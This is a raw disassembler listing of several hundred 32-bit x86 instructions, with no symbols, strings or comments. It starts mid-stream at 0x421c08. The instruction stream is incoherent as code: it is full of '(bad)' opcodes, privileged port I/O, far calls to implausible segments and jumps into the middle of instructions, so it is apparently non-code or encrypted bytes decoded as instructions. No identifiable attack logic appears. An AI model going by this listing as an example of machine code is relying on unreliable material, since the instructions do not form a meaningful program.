  421c08:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421c0f:	fst    DWORD PTR [edi]
  421c11:	xchg   ecx,eax
  421c12:	xlat   BYTE PTR ds:[ebx]
  421c13:	jns    0x421c92
  421c15:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421c1c:	fst    DWORD PTR [edi]
  421c1e:	xchg   ecx,eax
  421c1f:	xlat   BYTE PTR ds:[ebx]
  421c20:	jns    0x421c9f
  421c22:	shr    DWORD PTR [ebx*2+0x21f78914],cl
  421c29:	fst    DWORD PTR [edi]
  421c2b:	xchg   ecx,eax
  421c2c:	xlat   BYTE PTR ds:[ebx]
  421c2d:	jns    0x421c41
  421c2f:	jnp    0x421c58
  421c31:	pop    ebp
  421c32:	cmp    ecx,DWORD PTR [ecx+0x17d931f7]
  421c38:	mov    ebx,0xb50ca375
  421c3d:	shl    DWORD PTR [eax-0x76],cl
  421c40:	push   cs
  421c41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c42:	int3   
  421c43:	out    dx,eax
  421c44:	inc    DWORD PTR [edx-0x5de4139d]
  421c4a:	test   al,0x7
  421c4c:	pop    es
  421c4d:	cmp    BYTE PTR [eax+0x37],al
  421c50:	mov    ah,0xf3
  421c52:	sbb    edx,DWORD PTR [esi-0x41]
  421c55:	push   ebx
  421c56:	mov    cl,0xbc
  421c58:	bound  ebp,QWORD PTR ds:0xce90b8ba
  421c5e:	xor    eax,0xf5def091
  421c63:	xchg   BYTE PTR [ebp+0x30],bh
  421c66:	mov    ebp,0xcdfccabb
  421c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c6c:	icebp  
  421c6d:	fsub   DWORD PTR [edi-0x719f97a7]
  421c73:	shl    DWORD PTR [esi-0x72c40f1],1
  421c79:	cmc    
  421c7a:	neg    edx
  421c7c:	jb     0x421ca0
  421c7e:	xchg   BYTE PTR [eax+0x51],dh
  421c81:	icebp  
  421c82:	mov    cl,0x70
  421c84:	call   0x4e00:0x509120d9
  421c8b:	lods   eax,DWORD PTR ds:[esi]
  421c8c:	pop    es
  421c8d:	test   BYTE PTR [esi+0x7ceaa343],0x75
  421c94:	test   BYTE PTR [ecx-0x4b3a7e4],0x0
  421c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c9c:	adc    BYTE PTR [edx-0x1789a30f],cl
  421ca2:	fldenv [esi-0x74]
  421ca5:	sahf   
  421ca6:	out    0x52,eax
  421ca8:	xor    eax,0x399b088c
  421cad:	outs   dx,BYTE PTR ds:[esi]
  421cae:	out    0x48,al
  421cb0:	mov    cl,0x64
  421cb2:	and    esi,DWORD PTR [ebx]
  421cb4:	mov    dh,0xd7
  421cb6:	dec    edx
  421cb7:	or     al,0xd3
  421cb9:	push   edx
  421cba:	push   ebp
  421cbb:	inc    edx
  421cbc:	xor    dl,dh
  421cbe:	loopne 0x421d08
  421cc0:	dec    esi
  421cc1:	pusha  
  421cc2:	push   cs
  421cc3:	fbld   TBYTE PTR [ebx-0x7b]
  421cc6:	xchg   ecx,eax
  421cc7:	sub    al,0xfa
  421cc9:	mov    esi,DWORD PTR [edi+0x5f]
  421ccc:	jge    0x421d13
  421cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ccf:	(bad)  
  421cd0:	pop    eax
  421cd1:	imul   ebp,DWORD PTR [ecx],0xd
  421cd4:	sbb    BYTE PTR [edi-0x65009aca],dl
  421cda:	mov    bh,0xac
  421cdc:	repz (bad) [edi-0x180467d8]
  421ce3:	ins    BYTE PTR es:[edi],dx
  421ce4:	push   edi
  421ce5:	aam    0x59
  421ce7:	ss out 0x39,al
  421cea:	leave  
  421ceb:	mov    bl,0x1a
  421ced:	fsubr  QWORD PTR [ebp-0x22]
  421cf0:	call   DWORD PTR [bx+di]
  421cf3:	icebp  
  421cf4:	jmp    0xfe9a8330
  421cf9:	or     BYTE PTR [eax-0x5e487e47],bl
  421cff:	inc    edi
  421d00:	cmp    esp,DWORD PTR [edi]
  421d02:	sub    DWORD PTR [edi-0x7],edi
  421d05:	sub    ax,0x82b7
  421d09:	pop    esp
  421d0a:	aam    0xc0
  421d0c:	inc    esp
  421d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d0e:	pop    esi
  421d0f:	dec    ecx
  421d10:	popa   
  421d11:	add    BYTE PTR [ecx-0x35],bl
  421d14:	pop    ebx
  421d15:	xor    DWORD PTR [ecx],0xffffff87
  421d18:	xchg   edx,eax
  421d19:	sbb    esp,0xffffffd5
  421d1c:	gs (bad) 
  421d1e:	out    0xd5,al
  421d20:	add    eax,0xa5b5b1f6
  421d25:	not    DWORD PTR fs:[ecx+0x17]
  421d29:	std    
  421d2a:	mov    ch,0x74
  421d2c:	stc    
  421d2d:	loop   0x421d53
  421d2f:	ret    0x1551
  421d32:	stos   BYTE PTR es:[edi],al
  421d33:	and    al,0x88
  421d35:	jmp    0x6b2b40cc
  421d3a:	adc    BYTE PTR [ecx-0x4ca0e830],cl
  421d40:	je     0x421cdf
  421d42:	(bad)  
  421d43:	push   0x2d
  421d45:	lods   eax,DWORD PTR ds:[esi]
  421d46:	mov    cl,0x25
  421d48:	sbb    BYTE PTR [ebp+0x4a417a64],cl
  421d4e:	push   eax
  421d4f:	adc    BYTE PTR [ecx],ah
  421d51:	adc    bh,dh
  421d53:	cmc    
  421d54:	fdivr  DWORD PTR [esi-0x36]
  421d57:	add    BYTE PTR [eax+0x27a9dcea],cl
  421d5d:	ror    BYTE PTR [eax-0x3a],1
  421d60:	ficom  DWORD PTR [ebx-0x2f]
  421d63:	adc    al,0x96
  421d65:	or     BYTE PTR [edx-0x1ae50903],bl
  421d6b:	cmp    BYTE PTR [esi],cl
  421d6d:	or     al,0xd9
  421d70:	xchg   esp,eax
  421d71:	ins    DWORD PTR es:[edi],dx
  421d72:	lea    ecx,[eax]
  421d74:	popf   
  421d75:	loopne 0x421de0
  421d77:	rcr    esi,0x27
  421d7a:	pop    edi
  421d7b:	sub    eax,0xf5e63b5b
  421d80:	adc    al,0x21
  421d82:	adc    al,0x72
  421d84:	imul   ebp,DWORD PTR [esi],0x27f72f6c
  421d8a:	cmp    DWORD PTR [esp+eiz*4+0x11e8c762],edi
  421d91:	xor    BYTE PTR [esp+ebp*1+0x49],ch
  421d95:	(bad)  
  421d96:	dec    eax
  421d97:	add    edx,DWORD PTR [eax+0x2a868560]
  421d9d:	rcl    edi,1
  421d9f:	mov    al,ds:0xa6ae4c31
  421da4:	repnz push 0xe855d7e5
  421daa:	adc    BYTE PTR [edi-0x49],bl
  421dad:	add    DWORD PTR [eax-0xc3b96e3],0x22fe292e
  421db7:	aam    0xb4
  421db9:	adc    al,0xab
  421dbb:	mov    ecx,DWORD PTR [eax]
  421dbd:	push   ds
  421dbe:	xchg   edi,eax
  421dbf:	stc    
  421dc0:	or     al,dl
  421dc2:	sub    eax,0x3f6b155c
  421dc7:	outs   dx,WORD PTR ds:[esi]
  421dc9:	lea    esp,[eax-0x45f45867]
  421dcf:	xchg   ebp,eax
  421dd0:	sub    BYTE PTR [edi+0x6d],bh
  421dd3:	and    dl,ch
  421dd5:	inc    edx
  421dd6:	sar    BYTE PTR ds:0x39f38ac,0x6a
  421ddd:	inc    ebp
  421dde:	fistp  WORD PTR [edi]
  421de0:	int3   
  421de1:	xchg   ecx,eax
  421de2:	push   eax
  421de3:	pop    edi
  421de4:	test   DWORD PTR [esi-0x42],ebp
  421de7:	fadd   DWORD PTR [edi]
  421de9:	aas    
  421dea:	cli    
  421deb:	jg     0x421e4c
  421ded:	hlt    
  421dee:	gs inc eax
  421df0:	(bad)  
  421df1:	push   edx
  421df2:	lahf   
  421df3:	sub    esi,DWORD PTR [ebp+edx*8+0x4d]
  421df7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421df8:	pop    edi
  421df9:	push   ecx
  421dfa:	sbb    DWORD PTR [edi+0x167e8c21],ecx
  421e00:	adc    ebp,DWORD PTR [edi-0x2f08b2a4]
  421e06:	adc    ebx,DWORD PTR [edi]
  421e08:	sub    eax,0xa47cf96
  421e0d:	push   0x42d7e0af
  421e12:	xor    eax,0x7b1fe3ae
  421e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e18:	iret   
  421e19:	retf   
  421e1a:	xchg   edx,eax
  421e1b:	mov    esp,?
  421e1d:	dec    esp
  421e1e:	jg     0x421e8e
  421e20:	in     eax,dx
  421e21:	cmp    BYTE PTR [ebp+ebp*2+0x55],bl
  421e25:	ret    0xa45e
  421e28:	mov    ebx,0x50cefb04
  421e2d:	stc    
  421e2e:	adc    al,0x7b
  421e30:	out    dx,eax
  421e31:	or     BYTE PTR [ebx+eiz*8+0x5f],ch
  421e35:	add    ebp,esi
  421e37:	pop    ds
  421e38:	xlat   BYTE PTR ds:[ebx]
  421e39:	fisttp QWORD PTR fs:[ecx]
  421e3c:	adc    ah,BYTE PTR [edx]
  421e3e:	mov    bl,0xe3
  421e40:	fstp   QWORD PTR [edx]
  421e42:	dec    si
  421e44:	adc    eax,0x95be4415
  421e49:	xor    al,0xa7
  421e4b:	adc    ebx,DWORD PTR [eax+0x6f55dc2d]
  421e51:	ret    0x1383
  421e54:	push   ecx
  421e55:	adc    ecx,ebx
  421e57:	jne    0x421e5d
  421e59:	pop    edx
  421e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e5c:	addr16 pushf 
  421e5e:	nop
  421e5f:	and    BYTE PTR [esi],al
  421e61:	hlt    
  421e62:	xchg   ebp,eax
  421e63:	inc    ecx
  421e64:	add    edi,esi
  421e66:	das    
  421e67:	(bad)  
  421e68:	pop    eax
  421e69:	cmp    bl,al
  421e6b:	mov    al,0x58
  421e6d:	inc    eax
  421e6e:	popf   
  421e6f:	mov    ebp,0x4806b621
  421e74:	add    ch,0x3f
  421e77:	stos   DWORD PTR es:[edi],eax
  421e78:	into   
  421e79:	std    
  421e7a:	cdq    
  421e7b:	inc    ebp
  421e7c:	pusha  
  421e7d:	push   esi
  421e7e:	fs loope 0x421e92
  421e81:	sahf   
  421e82:	lods   al,BYTE PTR ds:[esi]
  421e83:	sar    BYTE PTR ds:0x4c8458f5,cl
  421e89:	sub    ch,ah
  421e8b:	arpl   ax,bx
  421e8d:	inc    ecx
  421e8e:	dec    ebp
  421e8f:	(bad)  [esi]
  421e91:	in     al,dx
  421e92:	jecxz  0x421e1a
  421e94:	cmp    BYTE PTR [ecx],cl
  421e96:	mov    ah,0xb4
  421e98:	fldenv [edi]
  421e9a:	sbb    al,0xa7
  421e9c:	int3   
  421e9d:	sbb    al,BYTE PTR [edx+0x34]
  421ea0:	aad    0xfe
  421ea2:	loopne 0x421e9a
  421ea4:	loop   0x421efe
  421ea6:	daa    
  421ea7:	inc    edi
  421ea8:	xchg   esi,eax
  421ea9:	dec    edi
  421eaa:	mov    dh,0x35
  421eac:	jl     0x421ea5
  421eae:	mov    bh,0x78
  421eb0:	cmc    
  421eb1:	or     ebx,DWORD PTR [ebp-0x12ba7967]
  421eb7:	jb     0x421e80
  421eb9:	(bad)  
  421eba:	mov    fs,WORD PTR [esi]
  421ebc:	fsubr  st,st(7)
  421ebe:	inc    ebx
  421ebf:	push   ebp
  421ec0:	xor    eax,DWORD PTR [edi+0x37a99cee]
  421ec6:	stos   DWORD PTR es:[edi],eax
  421ec7:	xchg   esp,eax
  421ec8:	(bad)  
  421eca:	gs popf 
  421ecc:	ds pop esi
  421ece:	pop    ebx
  421ecf:	pop    ss
  421ed0:	cwde   
  421ed1:	call   0x8255:0x8182
  421ed7:	mov    DWORD PTR [edx-0x48],ecx
  421eda:	jae    0x421f3c
  421edc:	sbb    ecx,ebp
  421ede:	icebp  
  421edf:	jg     0x421ebb
  421ee1:	ins    DWORD PTR es:[edi],dx
  421ee2:	mov    ch,0x3e
  421ee4:	inc    ecx
  421ee5:	add    esp,DWORD PTR [edx-0x70]
  421ee8:	lods   al,BYTE PTR ds:[esi]
  421ee9:	ret    0xd583
  421eec:	dec    ebp
  421eed:	js     0x421f26
  421eef:	sub    eax,0x448e9ef1
  421ef4:	pop    ss
  421ef5:	call   0xc754:0xb334c1fc
  421efc:	mov    cs,WORD PTR [edx+ebx*4-0x60]
  421f00:	inc    ebp
  421f01:	fild   DWORD PTR [esi]
  421f03:	sub    DWORD PTR [eax+edi*8+0x4ad677f6],ebp
  421f0a:	xor    al,0x13
  421f0c:	xor    cl,BYTE PTR [ecx]
  421f0e:	add    DWORD PTR [ebx+0x1d6e20eb],edx
  421f14:	jl     0x421f45
  421f16:	into   
  421f17:	inc    esp
  421f18:	in     al,dx
  421f19:	in     al,0x26
  421f1b:	xor    eax,ebp
  421f1d:	jne    0x421f2c
  421f1f:	jle    0x421f24
  421f21:	jno    0x421f6d
  421f23:	dec    edi
  421f24:	popa   
  421f25:	std    
  421f26:	dec    eax
  421f27:	jg     0x421f66
  421f29:	inc    eax
  421f2a:	adc    ecx,DWORD PTR [edi-0x6d]
  421f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f2e:	in     eax,0x8d
  421f30:	mov    ch,0xfc
  421f32:	xchg   edi,eax
  421f33:	lahf   
  421f34:	mov    eax,ds:0xb4e608c4
  421f39:	xchg   ecx,eax
  421f3a:	jne    0x421f30
  421f3c:	mov    esp,0x7f38caab
  421f41:	pop    ebp
  421f42:	pop    edx
  421f43:	push   esp
  421f44:	mov    bl,0xfe
  421f46:	mov    ds:0x471addc9,al
  421f4b:	sahf   
  421f4c:	lahf   
  421f4d:	loop   0x421f82
  421f4f:	pop    ds
  421f50:	xchg   edx,eax
  421f51:	mov    ecx,0x3ce5b714
  421f56:	dec    eax
  421f57:	jo     0x421f6b
  421f59:	gs xchg edx,eax
  421f5b:	shl    DWORD PTR [esi-0x2d7bb361],1
  421f61:	sbb    ch,bl
  421f63:	out    0x33,al
  421f65:	cmp    DWORD PTR [ebp-0x2f],edx
  421f68:	das    
  421f69:	adc    bl,cl
  421f6b:	(bad)  
  421f6c:	dec    edx
  421f6d:	(bad)  
  421f6e:	aas    
  421f6f:	psllw  mm2,QWORD PTR [ecx]
  421f72:	push   edx
  421f73:	ficom  WORD PTR [edi]
  421f75:	mov    cl,0x1b
  421f77:	(bad)  
  421f78:	pushw  0x77
  421f7b:	lds    edx,FWORD PTR [edi+0x15cbaf35]
  421f81:	dec    esp
  421f82:	out    dx,al
  421f83:	hlt    
  421f84:	mov    al,0xe3
  421f86:	xchg   edi,eax
  421f87:	in     eax,0x55
  421f89:	add    al,0x0
  421f8b:	shl    DWORD PTR [eax+0x75],cl
  421f8e:	pop    edx
  421f8f:	faddp  st(1),st
  421f91:	sar    DWORD PTR [ecx+0x76],1
  421f94:	jno    0x422008
  421f96:	ficom  WORD PTR gs:[ebx+0x6e]
  421f9a:	sub    DWORD PTR [edi+edx*4],0x6178aa50
  421fa1:	jle    0x421f70
  421fa3:	xchg   DWORD PTR [esi+0x5],esp
  421fa6:	imul   esp,DWORD PTR [ebx-0x80],0x2a
  421faa:	mul    BYTE PTR [esi-0x49571e51]
  421fb0:	fidiv  WORD PTR [eax+0xd]
  421fb3:	xchg   esi,eax
  421fb4:	sub    BYTE PTR fs:[edx-0x44cd0c6c],bl
  421fbb:	sahf   
  421fbc:	test   BYTE PTR [ecx+eiz*4+0x4b],0xe5
  421fc1:	pop    ecx
  421fc2:	ja     0x421ff6
  421fc4:	xchg   ebx,eax
  421fc5:	dec    ebp
  421fc6:	dec    esp
  421fc7:	shr    DWORD PTR [ebx],1
  421fc9:	sbb    al,0x8e
  421fcb:	iret   
  421fcc:	add    dh,BYTE PTR [ebp-0x5b37e6e1]
  421fd2:	lods   al,BYTE PTR ds:[esi]
  421fd3:	fsub   QWORD PTR [ecx-0x73410816]
  421fd9:	data16 jp 0x42203e
  421fdc:	loope  0x421fd8
  421fde:	mov    edx,0x9ca102fb
  421fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fe4:	add    bh,bh
  421fe6:	dec    esp
  421fe7:	addr16 jg 0x421ff9
  421fea:	xor    cl,BYTE PTR [edx]
  421fec:	popf   
  421fed:	inc    esp
  421fee:	(bad)  
  421fef:	repz and eax,0xec3a96db
  421ff5:	fisttp QWORD PTR ds:0xb5e6639a
  421ffb:	mov    eax,esi
  421ffd:	or     DWORD PTR [edi+0x1a],eax
  422000:	pop    ebp
  422001:	or     DWORD PTR [ecx-0x7b],esi
  422004:	(bad)  
  422005:	int3   
  422006:	int    0x47
  422008:	sbb    al,0x38
  42200a:	push   ebx
  42200b:	jae    0x421fcf
  42200d:	cli    
  42200e:	or     bh,BYTE PTR [ebp-0x44]
  422011:	pop    ds
  422012:	(bad)  
  422013:	sub    eax,0x6e1406f8
  422018:	pusha  
  422019:	cmc    
  42201a:	in     al,0x86
  42201c:	es jg  0x421fcf
  42201f:	ss in  eax,dx
  422021:	call   0xa2b92f27
  422026:	iret   
  422027:	cmp    DWORD PTR ds:0x1ebeef16,0x50
  42202e:	mov    eax,eax
  422030:	pusha  
  422031:	pop    edx
  422032:	mov    edx,fs
  422034:	and    esp,DWORD PTR [ebx+esi*4]
  422037:	scas   al,BYTE PTR es:[edi]
  422038:	sub    al,0x57
  42203a:	dec    edi
  42203b:	(bad)  
  42203c:	into   
  42203d:	mov    eax,0xb2faa117
  422042:	jmp    0x337a8c81
  422047:	in     al,dx
  422048:	(bad)  
  422049:	sbb    BYTE PTR [edi+0x19],0x75
  42204d:	fcomp  DWORD PTR [ebx-0x72]
  422050:	push   edi
  422051:	fimul  WORD PTR ss:[ebp+ecx*8-0x19e20d7c]
  422059:	mov    ebp,0x59fd48a1
  42205e:	das    
  42205f:	xor    al,0xef
  422061:	loop   0x42205b
  422063:	cmp    bl,BYTE PTR [edx]
  422065:	xlat   BYTE PTR ds:[ebx]
  422066:	mov    BYTE PTR [ecx+0x68b2bdf0],ah
  42206c:	adc    DWORD PTR [edx-0x6b],ecx
  42206f:	(bad)  
  422071:	out    dx,eax
  422072:	jecxz  0x42205b
  422074:	xchg   esp,eax
  422075:	pop    edx
  422076:	push   cs
  422077:	shl    bl,cl
  422079:	ds jno 0x422071
  42207c:	retf   
  42207d:	addr16 cs pop ss
  422080:	(bad)  
  422081:	push   esi
  422082:	push   esp
  422083:	add    al,BYTE PTR [edi]
  422085:	sbb    ebp,ebp
  422087:	jmp    0x2d42cc24
  42208c:	mov    DWORD PTR [bp+di],eax
  42208f:	jno    0x422078
  422091:	or     BYTE PTR [ecx],dh
  422093:	fdiv   DWORD PTR [eax+0x39]
  422096:	cmp    al,BYTE PTR [ebp+eiz*4-0x16]
  42209a:	fld    DWORD PTR [edi-0x76]
  42209d:	jle    0x422116
  42209f:	lahf   
  4220a0:	mov    es,edx
  4220a2:	adc    al,0xc5
  4220a4:	inc    ebp
  4220a5:	push   0x21
  4220a7:	mov    edi,0xc2d9e502
  4220ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ad:	xor    eax,0x6cd2e25e
  4220b2:	xchg   edi,eax
  4220b3:	rol    DWORD PTR [edx],cl
  4220b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220b6:	fs fs mov dl,0x1e
  4220ba:	cmp    al,0x6
  4220bc:	cmp    dl,BYTE PTR [si]
  4220bf:	dec    esp
  4220c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220c1:	je     0x422120
  4220c3:	sbb    eax,DWORD PTR [esi]
  4220c5:	push   ss
  4220c6:	xor    eax,0x1c1bba44
  4220cb:	ja     0x4220aa
  4220cd:	cdq    
  4220ce:	pop    es
  4220cf:	xor    DWORD PTR [esi+0x74892964],esp
  4220d5:	inc    eax
  4220d6:	aaa    
  4220d7:	add    bl,al
  4220d9:	xchg   ebp,eax
  4220da:	xchg   DWORD PTR [edx+ecx*8-0x24030c6d],ebp
  4220e1:	nop
  4220e2:	sar    bl,cl
  4220e4:	out    0x3b,eax
  4220e6:	push   ebp
  4220e7:	imul   ebx,DWORD PTR [eax+ecx*4-0x6980749e],0x29f8d05d
  4220f2:	call   0x31f81aae
  4220f7:	ror    BYTE PTR fs:[edx+0x2949fcef],0x78
  4220ff:	(bad)  
  422100:	fmul   DWORD PTR [ecx+0x5e]
  422103:	pop    edx
  422104:	outs   dx,DWORD PTR ds:[esi]
  422105:	add    ch,BYTE PTR [edx]
  422107:	(bad)  
  422108:	jno    0x4220be
  42210a:	add    dh,BYTE PTR [ebx-0x362f2a8f]
  422110:	adc    ah,BYTE PTR [ebp-0xaf2f57c]
  422116:	and    eax,0x62d22474
  42211b:	icebp  
  42211c:	fistp  DWORD PTR [esi-0x7d06e297]
  422122:	addr16 (bad) 
  422124:	loopne 0x42218e
  422126:	xlat   BYTE PTR ds:[ebx]
  422127:	pop    eax
  422128:	test   DWORD PTR [edx+0x45],0x5b6b398c
  42212f:	ins    BYTE PTR es:[edi],dx
  422130:	push   0xf433b311
  422135:	mov    eax,0x96d2a9e
  42213a:	shl    BYTE PTR [ebp+eiz*4+0x4e6702bd],0x6c
  422142:	fsub   st,st(7)
  422144:	lods   al,BYTE PTR ds:[esi]
  422145:	add    bl,BYTE PTR [ebx]
  422147:	sub    cl,BYTE PTR [edi-0x29]
  42214a:	aam    0xfd
  42214c:	into   
  42214d:	adc    BYTE PTR [ebp-0x4c],ch
  422150:	test   esi,esi
  422152:	mov    cx,0xba18
  422156:	(bad)  
  422157:	fidivr DWORD PTR [edx]
  422159:	pushf  
  42215a:	push   ss
  42215b:	into   
  42215c:	aam    0x2a
  42215e:	retf   
  42215f:	int3   
  422160:	sbb    ah,al
  422162:	test   DWORD PTR [ecx+edx*8+0x1e],ebp
  422166:	adc    eax,DWORD PTR [esi]
  422168:	int3   
  422169:	repz arpl WORD PTR ds:0xe8f45e5e,bp
  422170:	pop    esi
  422171:	ins    BYTE PTR es:[edi],dx
  422172:	sbb    ah,cl
  422174:	and    BYTE PTR [ebx+eax*4-0x2e8a1f94],al
  42217b:	jmp    0x42211a
  42217d:	mov    bh,0xa
  42217f:	inc    edx
  422180:	sub    DWORD PTR [ebx+0x3c],eax
  422183:	shl    BYTE PTR [ebx+0x5f],cl
  422186:	in     eax,dx
  422187:	jns    0x422141
  422189:	add    DWORD PTR [esp+edi*4-0x734db454],ebx
  422190:	dec    edx
  422191:	and    al,bh
  422193:	cmp    al,0xe9
  422195:	jle    0x42211e
  422197:	sub    al,0x6a
  422199:	outs   dx,DWORD PTR ds:[esi]
  42219a:	sub    al,BYTE PTR [edx+0x40]
  42219d:	push   es
  42219e:	shr    DWORD PTR [edi+0x3b],0x27
  4221a2:	push   esp
  4221a3:	aad    0x3a
  4221a5:	(bad)  
  4221a6:	jl     0x4221a1
  4221a8:	xor    ebp,DWORD PTR [ecx+0x1b414f19]
  4221ae:	adc    BYTE PTR [ecx-0x6bff3826],al
  4221b4:	add    eax,0x9aadd9c4
  4221b9:	cmp    ebp,esp
  4221bb:	out    dx,eax
  4221bc:	jmp    0x127ceebc
  4221c1:	cmp    al,0xab
  4221c3:	push   ebp
  4221c4:	push   ebx
  4221c5:	repnz rol DWORD PTR fs:[edx],1
  4221c9:	dec    edx
  4221ca:	and    DWORD PTR [edi+0x2bcdaa52],esp
  4221d0:	lea    ebp,[edi-0x17]
  4221d3:	int3   
  4221d4:	cmp    dh,BYTE PTR [ebp+0x6f]
  4221d7:	out    0x3d,al
  4221d9:	mov    ds:0x255411a7,eax
  4221de:	jecxz  0x42218e
  4221e0:	addr16 (bad) 
  4221e2:	adc    al,0x56
  4221e4:	mov    DWORD PTR [ebx],edx
  4221e6:	xchg   esi,eax
  4221e7:	outs   dx,BYTE PTR ds:[esi]
  4221e8:	popa   
  4221e9:	jg     0x4221c0
  4221eb:	loop   0x4221b4
  4221ed:	push   ebp
  4221ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221ef:	add    ebp,DWORD PTR [ecx+0x32]
  4221f2:	rcr    BYTE PTR [ecx],cl
  4221f4:	fs imul esp,esi,0x2ed5343a
  4221fb:	and    bl,BYTE PTR [edi]
  4221fd:	test   al,0x29
  4221ff:	inc    edi
  422200:	jg     0x4221f3
  422202:	int    0x49
  422204:	leave  
  422205:	push   0xffffffe1
  422207:	dec    edx
  422208:	xchg   edx,eax
  422209:	cmp    edx,esp
  42220b:	pusha  
  42220c:	mov    ah,0x1a
  42220e:	mov    bl,0x6a
  422210:	adc    ch,BYTE PTR [edx-0x69]
  422213:	inc    esi
  422214:	xor    BYTE PTR [esi+ebx*8-0x6fb2b8ee],ah
  42221b:	inc    edx
  42221c:	in     al,0xbb
  42221e:	out    dx,eax
  42221f:	jg     0x422221
  422221:	push   ebp
  422222:	lods   eax,DWORD PTR ds:[esi]
  422223:	mov    eax,0x6692c8f0
  422228:	scas   al,BYTE PTR es:[edi]
  422229:	in     eax,0x19
  42222b:	inc    esp
  42222c:	fsub   DWORD PTR [eax]
  42222e:	mov    ebp,0xca7dec6f
  422233:	out    dx,eax
  422234:	push   ecx
  422235:	add    edi,eax
  422237:	cmp    ah,BYTE PTR [edi]
  422239:	shl    BYTE PTR [edi-0xa20d318],1
  42223f:	lock and esi,DWORD PTR [ebp+0x38]
  422243:	cmp    BYTE PTR [esi+esi*8],bh
  422246:	pop    edi
  422247:	fisttp WORD PTR [edx+0x7a8e451f]
  42224d:	xchg   ecx,eax
  42224e:	icebp  
  42224f:	in     al,dx
  422250:	adc    eax,0x297ae76c
  422255:	icebp  
  422256:	std    
  422257:	sub    cl,BYTE PTR [eax]
  422259:	sub    dh,BYTE PTR [esi+edx*2]
  42225c:	push   0x79
  42225e:	daa    
  42225f:	push   ebp
  422260:	cmp    bh,0x71
  422263:	bound  esp,QWORD PTR [eax+eiz*2+0x53]
  422267:	cmp    ecx,DWORD PTR [ebp-0xd]
  42226a:	enter  0x94e7,0x4b
  42226e:	and    BYTE PTR [esi+0xa],ch
  422271:	mov    dl,0xf3
  422273:	les    edi,FWORD PTR [ecx+eax*4]
  422276:	retf   0x6fe3
  422279:	mov    eax,0x1185b3d5
  42227e:	data16 cli 
  422280:	push   edi
  422281:	push   es
  422282:	mov    eax,0xe053da05
  422287:	(bad)  
  422289:	mov    ah,0x17
  42228b:	pop    ds
  42228c:	stos   BYTE PTR es:[edi],al
  42228d:	mov    bh,0x3e
  42228f:	outs   dx,DWORD PTR ds:[esi]
  422290:	jmp    0x422257
  422292:	jo     0x422220
  422294:	and    DWORD PTR [esi],esp
  422296:	mov    ds:0x4560ed45,al
  42229b:	sub    BYTE PTR [ebx-0x1],dl
  42229e:	inc    ebp
  42229f:	jnp    0x42222f
  4222a1:	es adc eax,0xb97568b4
  4222a7:	jmp    0x4222c8
  4222a9:	adc    DWORD PTR [esi],ebx
  4222ab:	mov    al,ds:0x3e2844f4
  4222b0:	jge    0x4222df
  4222b2:	inc    eax
  4222b3:	stos   DWORD PTR es:[edi],eax
  4222b4:	sub    al,BYTE PTR [edx-0x2aa0ec11]
  4222ba:	popf   
  4222bb:	jns    0x422245
  4222bd:	fwait
  4222be:	cmp    dl,BYTE PTR [ebx+0x51]
  4222c1:	push   edx
  4222c2:	ja     0x422255
  4222c4:	jmp    0xf0e0e538
  4222c9:	xor    al,0xcc
  4222cb:	jecxz  0x42225c
  4222cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222cf:	add    BYTE PTR [edx-0x36],dl
  4222d2:	sbb    eax,0x49890993
  4222d7:	add    al,0xab
  4222d9:	jo     0x42231d
  4222db:	xchg   esp,eax
  4222dc:	mov    eax,ds:0x8cbdeb2
  4222e1:	ja     0x42234f
  4222e3:	sbb    al,0xb7
  4222e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222e6:	mov    edx,0x237f8633
  4222eb:	cmp    DWORD PTR [esi+0x1],0xfffffffd
  4222ef:	sti    
  4222f0:	xchg   edi,eax
  4222f1:	xor    BYTE PTR [ebx],cl
  4222f3:	adc    edi,DWORD PTR [ecx+0x7f]
  4222f6:	inc    BYTE PTR [eax+0x12]
  4222f9:	pushf  
  4222fa:	call   0x2a6805d6
  4222ff:	add    eax,0x32daccbc
  422304:	out    0xa8,eax
  422306:	xchg   ebx,eax
  422307:	rcr    DWORD PTR [ebx+eax*1-0x68],0xf0
  42230c:	fcomp  QWORD PTR [eax+0x4615f3b1]
  422312:	fld    QWORD PTR [esi]
  422314:	imul   ebp,DWORD PTR [ecx+0x57ea9d63],0x1a
  42231b:	mov    bl,0xdd
  42231d:	mov    bl,0xcd
  42231f:	test   dh,cl
  422321:	es push 0x3beb2746
  422327:	mov    al,dl
  422329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42232a:	mov    dh,0xf4
  42232c:	sahf   
  42232d:	add    BYTE PTR [eax],bl
  42232f:	(bad)  
  422331:	bound  ecx,QWORD PTR [edi+0x5e3e00d5]
  422337:	dec    ebx
  422338:	xchg   edx,eax
  422339:	arpl   si,si
  42233b:	mov    cl,0x23
  42233d:	push   0xffffffcb
  42233f:	(bad)  
  422340:	outs   dx,DWORD PTR ds:[esi]
  422341:	aaa    
  422342:	fwait
  422343:	add    edx,DWORD PTR [bx+si+0x2a]
  422347:	push   0xd0b6e66d
  42234c:	les    esi,FWORD PTR [ebx]
  42234e:	jmp    0x4222dc
  422350:	ret    0xdf1f
  422353:	das    
  422354:	ja     0xee8338bb
  42235a:	xchg   ebp,eax
  42235b:	push   esp
  42235c:	lods   al,BYTE PTR ds:[esi]
  42235d:	xchg   bl,bl
